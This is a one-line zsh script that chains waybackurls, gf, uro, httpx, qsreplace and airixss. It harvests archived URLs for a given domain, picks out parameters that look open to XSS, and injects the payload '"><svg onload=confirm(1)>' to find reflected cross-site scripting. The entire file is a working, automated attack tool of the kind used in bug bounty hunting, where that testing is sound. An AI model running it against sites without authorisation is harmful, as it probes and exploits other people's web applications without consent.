#! /usr/bin/zsh

echo "$1" | waybackurls | /root/Tools/gf/gf/gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
